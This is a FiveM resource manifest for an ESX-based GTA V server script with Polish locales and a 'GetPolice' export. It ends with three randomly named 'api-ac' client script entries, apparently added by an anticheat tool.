fx_version "bodacious"

games {"gta5"}
lua54 'yes'
server_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'server/main.lua',
	'config.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/pl.lua',
	'client/init.lua',
	'client/main.lua',
	'config.lua'
}

server_exports {
	"GetPolice"
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"